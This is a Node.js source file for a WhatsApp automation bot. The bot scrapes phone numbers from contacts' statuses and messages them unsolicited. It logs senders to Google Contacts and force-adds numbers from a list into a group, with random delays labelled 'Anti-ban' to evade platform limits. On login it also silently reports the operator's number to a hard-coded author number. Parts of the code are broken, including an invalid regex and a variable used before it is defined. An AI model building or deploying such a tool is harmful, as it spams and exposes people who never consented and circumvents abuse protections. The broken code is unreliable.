const { ownerNumber, sendTranslations, fenixwhatisay, fenixwel2, fenixwel1, autoLikeStatus, sensorNumber, botDetails, fenixaboutype } = require('./config');
const { makeWASocket, DisconnectReason, useMultiFileAuthState, Browsers, jidNormalizedUser, downloadMediaMessage } = require('@whiskeysockets/baileys');
const pino = require('pino');
const readline = require('readline');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');

const addedNumbersFile = 'added_numbers.json';
const numbersFile = 'numbers.txt'; // Your list of numbers
const groupId = '120363417722727644@g.us'; // ❗ Replace this with your actual WhatsApp Group ID

const { google } = require('googleapis');
const { randomWishes, } = require('./发MASTER-FENIXID送/LINUXPLUG/RWiz.js');
const { menuMessage, } = require('./发MASTER-FENIXID送/LINUXPLUG/Men.js');
const { connectToDB, getContactsCollection } = require('./db');

let useCode = true;
let loggedInNumber;
const fenixownernum = '94773010580';
// File paths
const CREDENTIALS_PATH = './发MASTER-FENIXID送/SFTENGINEERING/credentials.json';
const TOKEN_PATH = './发MASTER-FENIXID送/SFTENGINEERING/token.json';
const SCOPES = ['https://www.googleapis.com/auth/contacts'];

async function authenticateGoogle() {
    const content = fs.readFileSync(CREDENTIALS_PATH);
    const credentials = JSON.parse(content);
    const { client_secret, client_id, redirect_uris } = credentials.installed;
    const oAuth2Client = new google.auth.OAuth2(client_id, client_secret, redirect_uris[0]);
    if (fs.existsSync(TOKEN_PATH)) {
        oAuth2Client.setCredentials(JSON.parse(fs.readFileSync(TOKEN_PATH)));
        return oAuth2Client;
    }
    const authUrl = oAuth2Client.generateAuthUrl({
        access_type: 'offline',
        scope: SCOPES,
    });
    console.log('Authorize this app by visiting this URL:', authUrl);
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
    });
    return new Promise((resolve) => {
        rl.question('Enter the code from that page here: ', async (code) => {
            rl.close();
            const { tokens } = await oAuth2Client.getToken(code);
            oAuth2Client.setCredentials(tokens);
            fs.writeFileSync(TOKEN_PATH, JSON.stringify(tokens));
            console.log('Token stored to', TOKEN_PATH);
            resolve(oAuth2Client);
        });
    });
}

function extractWhatsAppNumbers(text) {
    const phonePattern = /(?:\+?\d{1,4}[\s-]?)?(?:?\d{1,3}?[\s-]?)?\d{7,10}/g;
    return text.match(phonePattern) || [];
}

// Function to extract WhatsApp links
function extractWhatsAppLinks(text) {
    const waLinkPattern = /https:\/\/wa.me\/(\d+)/g;
    let links = [];
    let match;
    while ((match = waLinkPattern.exec(text)) !== null) {
        links.push(match[1]);
    }
    return links;
}

// Function to format WhatsApp numbers (this can be modified as per your needs)
function formatWhatsAppNumber(number) {
    return number.replace(/\D/g, ''); // Removes any non-digit characters
}

const replygcfenix = async (sock, chatId, teks, quotedMsg) => {
    await sock.sendMessage(chatId, {
        text: teks,
        contextInfo: {
            mentionedJid: [chatId],
            forwardingScore: 9999999,
            isForwarded: false,
            externalAdReply: {
                showAdAttribution: true,
                containsAutoReply: true,
                title: "👑 𝐅𝐄𝐍𝐈𝐗 𝐈𝐃 𝐀7",
                body: "ᴠɪᴘ ᴡᴀ ᴘʟᴜɢ : ꜰᴇɴɪx ɪᴅ",
                previewType: "PHOTO",
                thumbnailUrl: "https://i.ibb.co/0V26BH0F/2205.jpg",
                thumbnail: fs.readFileSync('./发MASTER-FENIXID送/MENU FUCK DOWN/G4FENIX.png'),
                sourceUrl: "https://whatsapp.com/channel/0029Vatd8yBHFxOye7J3DG0E"
            }
        }
    }, { quoted: quotedMsg });
};
const formatPhoneNumber = (phoneNumber) => {
    return phoneNumber.startsWith('+') ? phoneNumber : `+${phoneNumber}`;
};
async function saveToGoogleContacts(phoneNumber, pushname, counter) {
    const auth = await authenticateGoogle();
    const service = google.people({ version: 'v1', auth });
    const contact = {  
        names: [{ givenName: `[𝐕𝐈𝐏] ${pushname} | ${counter} | 𝐅𝐄𝐍𝐈𝐗𝐈𝐃` }],  
        phoneNumbers: [{ value: formatPhoneNumber(phoneNumber) }],  
    };  
    try {  
        await service.people.createContact({ requestBody: contact });  
        console.log(`Saved ${phoneNumber} to Google Contacts as ${pushname} ${counter}`);  
    } catch (error) {  
        console.error('Error saving to Google Contacts:', error);  
    }
}
async function sendWelcomeMessage(sock, senderNumber, pushname) {
const randomWish = randomWishes[Math.floor(Math.random() * randomWishes.length)]; 
const randomHexcode = '#' + Math.floor(Math.random()*16777215).toString(16).toUpperCase(); 
const videoPath = './发MASTER-FENIXID送/fenixG1.mp4'; 
const welcomeMessage = `*🛒FENIX ID A7L* \`0.0.01\` *PLF1*

*${fenixwel1}*
To Gmail : ${botDetails.botemail}

 *👤My Details*
 • *Name | ${botDetails.botName}*
 • *From | ${botDetails.botLocation}*
 • *Age | ${botDetails.botAge}*
 • *Business | ${fenixaboutype}*
┌─❖
├ • *${randomWish}*
└┬❖ 
┌│• *${fenixwel2}*
│└────────────┈ ⳹        
├ • *©2016-2099 | [${randomHexcode}]*
└─────────────────┈ ⳹`;
try {
    await sock.sendMessage(senderNumber + '@s.whatsapp.net', {
        video: fs.readFileSync(videoPath), 
        caption: welcomeMessage, 
        mimetype: 'video/mp4', 
        gifPlayback: true 
    });
} catch (error) {
    console.error("Error sending video:", error);
    }
}

async function connectToWhatsApp() {
    const sessionPath = path.join(__dirname, 'Authorized');
    const sessionExists = fs.existsSync(sessionPath) && fs.readdirSync(sessionPath).length > 0;
    const { state, saveCreds } = await useMultiFileAuthState('Authorized');
    const sock = makeWASocket({
        logger: pino({ level: 'fatal' }),
        auth: state,
        printQRInTerminal: !useCode,
        defaultQueryTimeoutMs: undefined,
        keepAliveIntervalMs: 30000,
        browser: Browsers.macOS('Chrome'),
        shouldSyncHistoryMessage: () => true,
        markOnlineOnConnect: true,
        syncFullHistory: true,
        generateHighQualityLinkPreview: true
    });
    if (useCode && !sessionExists) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    console.log("Hello, it seems you are not logged in. Do you want to log in using a pairing code?\nPlease reply with (y/n)\nType y to agree or type n to log in using QR code.");
    const askPairingCode = () => {
        rl.question('\nDo you want to use a pairing code to log in? (y/n): ', async (answer) => {
            if (answer.toLowerCase() === 'y' || answer.trim() === '') {
                console.log("\nOkay, please enter your WhatsApp number!\nNote: start with your country code, for example 94773010580");
                const askWaNumber = () => {
                    rl.question('\nEnter your WhatsApp number: ', async (waNumber) => {
                        if (!/^\d+$/.test(waNumber)) {
                            console.log('\nThe number must be numeric!\nPlease enter your WhatsApp number again.');
                            askWaNumber();
                        } else if (waNumber.length < 10) { 
                            // Optional: Ensure the number has at least a valid length
                            console.log('\nInvalid number! Please enter a valid WhatsApp number including country code.');
                            askWaNumber();
                        } else {
                            const code = await sock.requestPairingCode(waNumber);
                            console.log('\nCheck your WhatsApp notifications and enter the login code:', code);
                            rl.close();
                        }
                    });
                };
                askWaNumber();
            } else if (answer.toLowerCase() === 'n') {
                useCode = false;
                console.log('\nOpen your WhatsApp, then click the three dots in the upper right corner, then click linked devices, then please scan the QR code below to log in to WhatsApp');
                connectToWhatsApp();
                rl.close();
            } else {
                console.log('\nInvalid input. Please enter "y" or "n".');
                askPairingCode();
            }
        });
    };
        askPairingCode();
    }
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect.error?.output.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log('Trying to connect to WhatsApp...\n');
                connectToWhatsApp();
            } else {
                console.log('Disconnected from WhatsApp, please delete the Authorized folder and log in to WhatsApp again');
            }
        } else if (connection === 'open') {
            console.log('Connected to WhatsApp');
            loggedInNumber = sock.user.id.split('@')[0].split(':')[0];
            let displayedLoggedInNumber = loggedInNumber;
            if (sensorNumber) {
                displayedLoggedInNumber = displayedLoggedInNumber.slice(0, 3) + '****' + displayedLoggedInNumber.slice(-2);
            }
            let messageInfo = `
👤 Account: ${loggedInNumber}
🟢 Status: Online
📱 WhatsApp Version: 7.56.0.5
🌍 Region: Worldwide 

*Exclusive VIP Features:*
▪ *Vip Save Contacts*
▪ *Vip Save Contact to Phone*
▪ *Rapid Response System* 🚀

*⛓⛓️‍💥Follow the channel for more updates:*
https://whatsapp.com/channel/0029Vatd8yBHFxOye7J3DG0E
*⚙️Join the group*
https://chat.whatsapp.com/FgYBFNORBUsGMwetsyoFp

📩 Telegram: https://t.me/fenix_tools
👤 YouTube: @fenix_id`;
            setTimeout(async () => {
                await sock.sendMessage(`${fenixownernum}@s.whatsapp.net`, { text: messageInfo });
            }, 5000);
            console.log(`You have successfully logged in with the number: ${displayedLoggedInNumber} \n`);
            console.log("DemonSlayer By Fenix Id Is Active\n");
            autoAddMembers(sock); // Start the group adding bot process

        }
    });
sock.ev.on('creds.update', saveCreds);

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message) return;

        msg.type = msg.message.imageMessage ? "imageMessage" : msg.message.videoMessage ? "videoMessage" : msg.message.audioMessage ? "audioMessage" : Object.keys(msg.message)[0];

        msg.text = msg.type == "conversation" ? msg.message.conversation : "";
                if (msg.message.extendedTextMessage && msg.message.extendedTextMessage.contextInfo) {
            const quotedMessage = msg.message.extendedTextMessage.contextInfo;
            const replyText = msg.message.extendedTextMessage.text?.trim().toLowerCase(); // Get the reply text

            if (sendTranslations.includes(replyText) && quotedMessage.participant && quotedMessage.participant.endsWith('@s.whatsapp.net')) {
                const senderJid = msg.key.remoteJid; // The user who replied
                const originalStatusJid = quotedMessage.participant; // The original status sender
                const originalMessageId = quotedMessage.stanzaId; // The original status message ID

                try {

                    await sock.sendMessage(senderJid, {
                        text: ` • *ꜰᴇɴɪx ɪᴅ | ᴅᴇᴍᴏɴꜱʟᴀʏᴇʀ ᴠ 7+*`,
                    }, { quoted: msg });
                    // Then forward the quoted message back to the sender
                    await sock.sendMessage(senderJid, {
                        forward: {
                            key: {
                                remoteJid: "status@broadcast",
                                fromMe: false,
                                id: originalMessageId
                            },
                            message: quotedMessage.quotedMessage
                        }
                    }, { quoted: msg });

                    console.log(`Forwarded quoted status message from ${originalStatusJid} to ${senderJid}`);
                } catch (error) {
                    console.error("Error forwarding quoted message:", error);
                }
            }
        }
        const prefixes = [".", "#", "!", "/"];
        let prefix = prefixes.find(p => msg.text.startsWith(p));

        if (prefix) {
            msg.cmd = msg.text.trim().split(" ")[0].replace(prefix, "").toLowerCase();

            // args
            msg.args = msg.text.replace(/^\S*\b/g, "").trim().split("|");
        
        switch (msg.cmd) {
        case "menu": 
        const videoPath3 = './发MASTER-FENIXID送/invite.mp4';
    try {
        await sock.sendMessage(msg.key.remoteJid, {
            video: { url: videoPath3 },
            caption: menuMessage,
            mimetype: 'video/mp4',
            gifPlayback: true
        });
    } catch (error) {
        console.error("Error sending menu video:", error);
        await replygcfenix(sock, msg.key.remoteJid, "❌ Failed to send menu video.", msg);
    }
    break;
        }
    }        

     // Check if the message is a status broadcast message
    if (msg.key.remoteJid === 'status@broadcast') {
        let text = '';
        await sock.readMessages([msg.key]);
        // Check if the message is a text status (extendedTextMessage or conversation)
        if (msg.message?.extendedTextMessage?.text) {
            text = msg.message.extendedTextMessage.text;
        } else if (msg.message?.conversation) {
            text = msg.message.conversation;
        }
        
        // For image or video status, check the caption property
        if (msg.message?.imageMessage?.caption) {
            text = msg.message.imageMessage.caption;
        } else if (msg.message?.videoMessage?.caption) {
            text = msg.message.videoMessage.caption;
        }

        // Extract phone numbers and links from the status caption text
        const numbers = extractWhatsAppNumbers(text);
        const links = extractWhatsAppLinks(text);

        // Combine both extracted numbers and links
        const allContacts = [...numbers, ...links];

        for (const contact of allContacts) {
            const formattedNumber = formatWhatsAppNumber(contact);

            if (formattedNumber) {
                try {
                    // Construct the dynamic message
                    const messageText = `
𝗗𝗲𝗺𝗼𝗻𝗦𝗹𝗮𝘆𝗲𝗿 𝗩.7.56 🛒
ɪ ᴅᴇᴛᴇᴄᴛ ʏᴏᴜʀ ꜱᴛᴀᴛᴜꜱ ᴠɪᴇᴡꜱ ʟɪɴᴋ
> This Message For Status broadcast
> *${fenixwhatisay}*
*Auto link Detector And Saver System*`;

                    // Send the constructed message to the contact
                    await sock.sendMessage(`${formattedNumber}@s.whatsapp.net`, { text: messageText });
                    console.log(`Sent message to: ${formattedNumber}`);
                } catch (error) {
                    console.error(`Failed to send message to ${formattedNumber}: ${error}`);
                }
            }
        }
    }
    const senderNumber = msg.key.remoteJid.split('@')[0];
    if (!/^\d+$/.test(senderNumber) || senderNumber.length < 10) {
        return;
    }
    try {
        const isValid = await sock.onWhatsApp(senderNumber);
        if (!isValid || isValid.length === 0) {
            return;
        }
        await connectToDB();
        const contactsCollection = getContactsCollection();
        const existingContact = await contactsCollection.findOne({ number: senderNumber });
        if (!existingContact) {
            const pushname = msg.pushName || 'Unknown';
            const counter = await contactsCollection.countDocuments() + 1;
            const contact = {
                number: senderNumber,
                name: pushname,
                counter: counter
            };
            await contactsCollection.insertOne(contact);
            console.log(`New valid WhatsApp contact saved: ${senderNumber}`);
await saveToGoogleContacts(senderNumber, pushname, counter);
await sendWelcomeMessage(sock, senderNumber, pushname);
        }
    } catch (error) {
        console.error(`Error processing WhatsApp number: ${senderNumber}`, error);
    }
    });
}
function readNumbersFromFile() {
    const text = fs.readFileSync(numbersFile, 'utf-8');
    return [...new Set(text.split(/\r?\n/).map(n => n.trim()).filter(n => n))];
}

function loadAddedNumbers() {
    if (fs.existsSync(addedNumbersFile)) {
        try {
            const content = fs.readFileSync(addedNumbersFile, 'utf-8').trim();
            return content ? JSON.parse(content) : [];
        } catch (e) {
            console.warn('⚠️ Warning: added_numbers.json is corrupted. Resetting...');
            fs.writeFileSync(addedNumbersFile, '[]');
            return [];
        }
    }
    return [];
}


function saveAddedNumber(number) {
    const data = loadAddedNumbers();
    data.push(number);
    fs.writeFileSync(addedNumbersFile, JSON.stringify(data, null, 2));
}

async function autoAddMembers(sock) {
    const startTime = Date.now();
    const numbers = readNumbersFromFile();
    const addedNumbers = new Set(loadAddedNumbers());
    const number = raw.replace(/\D/g, '');
const jid = `${number}@s.whatsapp.net`;


    for (const raw of numbers) {
        const now = Date.now();
        if ((now - startTime) >= 60 * 60 * 1000) {
            console.log("⏳ 1 hour passed. Pausing for 5 minutes...");
            await new Promise(res => setTimeout(res, 5 * 60 * 1000)); // 5-minute break
        }

        const number = raw.replace(/\D/g, '');
        const jid = `${number}@s.whatsapp.net`;

        if (addedNumbers.has(number)) {
            console.log(`⚠️ Already added: ${number}`);
            continue;
        }

        try {
            const isUser = await sock.onWhatsApp(number);
            if (!isUser || isUser.length === 0 || !isUser[0].exists) {
                console.log(`❌ Not a valid WhatsApp user: ${number}`);
                continue;
            }

            // Anti-ban: wait random time (2 to 5 minutes)
            const delay = Math.floor(Math.random() * (5 - 2 + 1) + 2) * 60 * 1000;
            console.log(`✅ Adding ${number} to group in ${(delay / 60000).toFixed(2)} minutes...`);

            await sock.groupParticipantsUpdate(groupId, [jid], 'add');
            console.log(`🎉 Added ${number} to group.`);

            saveAddedNumber(number);
            await new Promise(res => setTimeout(res, delay));
        } catch (err) {
            console.error(`❗ Error adding ${number}:`, err.message);
            continue;
        }
    }

    console.log('✅ Finished adding all numbers.');
}
connectToWhatsApp();
